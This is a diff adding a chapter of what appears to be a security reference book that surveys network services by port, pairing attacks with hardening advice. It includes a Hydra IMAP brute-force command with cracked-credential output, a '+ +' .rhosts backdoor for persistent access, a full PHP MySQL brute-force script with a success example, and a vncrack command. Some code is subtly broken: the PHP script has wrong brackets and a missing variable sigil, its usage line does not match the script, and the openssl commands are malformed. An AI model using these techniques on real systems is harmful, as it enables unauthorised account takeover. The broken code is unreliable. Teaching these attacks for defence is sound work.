@@ -1,0 +1,239 @@
+
+## IMAP2/IMAP4 (Internet Message Access Protocol 2/4): 143 (TCP)
+
+IMAP2/4 is an e-mail access protocol used to access e-mail from a mailbox server. Its features include the ability to store e-mail on a remote location.
+
+### Brute-Forcing
+
+IMAP authentication is susceptible to brute-force attacks.
+
+### Brute-Force IMAP
+
+Hydra can be used to brute-force IMAP:
+
+```
+[bash]$ hydra -L usernames.txt -P passwords.txt -s 143 192.168.1.1 imap
+Hydra v2.2 (c) 2002 by van Hauser / THC - use allowed only for legal purposes.
+Hydra is starting! [parallel tasks: 4, login tries: 4 (1:1/p:4)]
+[143][imap] login: pardesi password: estd1948!!
+Hydra finished.
+```
+
+### Prevent IMAP Brute-Forcing
+
+Please see “Common Defenses Against Brute-Force Attacks.”
+
+### Sniffing
+
+It is possible to sniff IMAP traffic being transmitted over a network.
+
+### Sniff IMAP Traffic
+
+Network sniffing tools such as Ettercap and Ethereal can be used to capture IMAP data being transmitted on the network.
+
+### Secure Alternatives
+
+If using IMAP, consider acting upon the following suggestions:
+
+- Use SSH to tunnel IMAP traffic:
+    ssh -L143:127.0.0.1:143 username@imapserver.somcompanyasnameexample.com
+- Use IMAPS as a secure replacement for IMAP.
+
+## HTTPS (Secure Hypertext Transfer Protocol): 443 (TCP)
+
+HTTPS is HTTP over SSL (Secure Sockets Layer). HTTPS uses SSL in order to set up and maintain a secure channel, and therefore provides encrypted communication between the client and the server.
+
+The command-line `openssl` tool can be used to connect to an HTTPS server:
+
+```
+openssl s_client -connect:server_ipaddress:443
+```
+
+OpenSSL is available at http://www.openssl.org/.
+
+**Software Vulnerabilities** The following paragraph represents a recent OpenSSL vulnerability:
+
+- **OpenSSL SSLv2 buffer overflow** OpenSSL is an open-source implementation of the SSL protocol. Versions of OpenSSL prior to 0.9.6e were found to contain a buffer overflow vulnerability that could lead to execution of arbitrary code on the server. Please see http://www.kb.cert.org/vuls/id/102795 for details.
+
+## rexec: 512 (TCP)
+
+The `rexec` command can be used to run commands on a remote host and display its output. Since `rexec` uses similar mechanisms as `rlogin`, please see the following “rlogin: 513 (TCP)” section.
+
+## rlogin: 513 (TCP)
+
+The `rlogin` command is used to establish a terminal session with a remote host.
+
+**Brute-forcing** Since a username and password combination is required to authenticate with `rlogin`, a brute-forcing tool such as Hydra can be used.
+
+**Sniffing** The login service uses a clear-text protocol. Network sniffer tools such as Ettercap or Ethereal can be used to sniff rlogin traffic on the network.
+
+**rlogin Misconfigurations** In order to facilitate password-less logins, a user may have to place a file called .rhosts in his home directory with the following contents:
+
+```
+mukumouse.somecompanyasanexample.com  jack
+```
+
+This will allow user jack from mukumouse.somecompanyasanexample.com to rlogin into his account on the host where the preceding .rhosts is placed without any password.
+
+### .rhosts Misconfigurations
+
+Consider an .rhosts file in a user’s home directory with the following contents:
+
+```
++  +
+```
+
+Such a file will allow any user from any host to logon into the user’s account with no password.
+
+> After a remote account is compromised, an intruder may place an .rhosts file in the victim’s home directory with “+ +” as its contents as just shown. This allows the intruder continued access to the victim’s account. Also, since the .rhosts file begins with a period, it is not shown when the victim user performs a directory listing using the ls command (unless the user specifies the -a flag along with the ls command).
+
+### Disable rlogin and Consider Alternatives
+
+If running the rlogin service, please consider the following recommendations:
+
+- Disable rsh, rlogin, and rexec services by commenting out the appropriate lines in your inetd.conf file.
+- Consider using SSH as a secure replacement.
+
+## rsh: 514 (TCP)
+
+The rsh command is used to execute commands on a remote machine. Since rsh uses similar mechanisms as rlogin, please see the preceding “rlogin: 513 (TCP)” section.
+
+## NNTPS (Secure Network News Transfer Protocol): 563 (TCP)
+
+NNTPS is NNTP over SSL (Secure Sockets Layer). NNTPS uses SSL in order to set up and maintain a secure channel, and therefore provides encrypted communication between the client and the server.
+
+The command-line openssl tool can be used to connect to an NNTPS server:
+
+```
+openssl s_client -connect:192.168.1.1:563
+```
+
+OpenSSL is available at **http://www.openssl.org/**.
+
+Please see “NNTP (Network News Transfer Protocol): 119 (TCP)” for more information.
+
+## IMAPS (Secure Internet Message Access Protocol): 993 (TCP)
+
+IMAPS is IMAP over SSL (Secure Sockets Layer). IMAPS uses SSL in order to set up and maintain a secure channel, and therefore provides encrypted communication between the client and the server.
+
+The command-line openssl tool can be used to connect to an IMAPS server:
+
+```
+openssl s_client -connect:192.168.1.1:993
+```
+
+OpenSSL is available at http://www.openssl.org/.
+
+Please see the earlier section “IMAP2/IMAP4 (Internet Message Access Protocol 2/4): 143 (TCP)” for more information.
+
+## POP3S (Secure Post Office Protocol 3): 995 (TCP)
+
+POP3S is POP3 over SSL (Secure Sockets Layer). POP3S uses SSL in order to set up and maintain a secure channel, and therefore provides encrypted communication between the client and the server.
+
+The command-line openssl tool can be used to connect to a POP3S server in order to obtain banner information:
+
+```
+openssl s_client -connect:192.168.1.1:995
+```
+
+OpenSSL is available at http://www.openssl.org/.
+
+Please see the earlier section “POP3 (Post Office Protocol 3): 110 (TCP)” for more information.
+
+## NFS: 2049 (TCP and UDP)
+
+See the earlier section “Portmapper: 111 (TCP).”
+
+## MySQL: 3306 (TCP)
+
+MySQL is a popular open-source database software package. It is available from http://www.mysql.com.
+
+**Brute-Forcing** Since MySQL authenticates using a username and password pair, it is possible to attempt a brute-force attack against it.
+
+### Brute-Force MySQL
+
+The following PHP script can be used to brute-force MySQL servers:
+
+```php
+<?
+/**
+Author: Nitesh Dhanjani [ hacknotes@dhanjani.com ]
+This script attempts a brute-force attack on MySQL servers. Please
+make sure $usernamefile and $passwordfile are set to filenames
+containing usernames and passwords to attempt.
+*/
+$usernamefile="usernames.txt";
+$passwordfile="passwords.txt";
+
+if($argc != 2)
+(
+    print "Usage: $argv[0] hostname\n";
+    exit();
+)
+$filehandle=@fopen($usernamefile,"r");
+$pflehandle=@fopen($passwordfile,"r");
+if(!$filehandle)||(!pflehandle))
+{
+    print("Could not open username or password file.\n");
+    exit();
+}
+while($username=@fscanf($filehandle,"%s\n"))
+{
+    while($password=@fscanf($pflehandle,"%s\n"))
+        if(@mysql_connect ($argv[1],$username[0],$password[0]))
+            print("SUCCESS! : $username[0], $password[0]\n");
+}
+print("DONE\n");
+?>
+```
+
+Let us call the preceding file mssqlbrute.php. Here is an example usage of the script:
+
+```
+[bash]$ php -f mssqlbrute.php mssql,somecompanypassanexample.com
+SUCCESS!: root, sqlMyP455!
+DONE
+```
+
+The PHP programming language interpreter can be downloaded from http://www.php.net/.
+
+### Prevent MySQL Brute-Forcing
+
+Please see “Common Defenses Against Brute-Force Attacks.”
+
+### Sniffing
+
+MySQL uses a clear-text protocol to establish connections between the client and the server. Therefore, MySQL sessions can be sniffed by users on a network segment.
+
+### Sniff MySQL Traffic
+
+Ettercap can be used to capture MySQL hashes sent over the network during authentication (Figure 4-1). In addition, because MySQL uses clear-text mechanisms to transfer data, a user session can be watched using a network analyzer such as Ettercap or Ethereal. Ethereal can be downloaded from http://www.ethereal.com/.
+
+![](img/77287f6ef97ef0bed6e23f6610950d06_151_0.png)
+
+Figure 4-1. Ethereal can be used to capture MySQL sessions.
+
+### Block and Harden MySQL
+
+If you run MySQL servers on your hosts, please consider the following recommendations:
+
+- Configure your firewall to block incoming connections to your MySQL server. In most cases, only local MySQL access is required.
+- Harden your MySQL configuration to not accept connections from remote users. See http://www.mysql.com/documentation/mysql/bychapter/manual_MySQL_Database_Administration.html#Privilege_system for detailed instructions.
+
+## VNC (Virtual Network Computing): 5800+, 5900+ (TCP)
+
+VNC is a remote-control software package that allows someone to access the desktop of a remote host. VNC is freeware and can be downloaded from http://www.realvnc.com/.
+
+### Brute-Forcing
+
+VNC instances require only a password in order to authenticate. Therefore, VNC accounts can be remotely brute-forced.
+
+### Brute-Force VNC
+
+It is possible to attempt a brute-force attack on VNC using the vncrack tool available at http://www.phenoelit.de/vncrack/.
+
+```
+[bash]$ vncrack -h 10.0.0.1 -w passwords.txt
+
+VNCCrack - by Phenoelit (http://www.phenoelit.de/)
+```
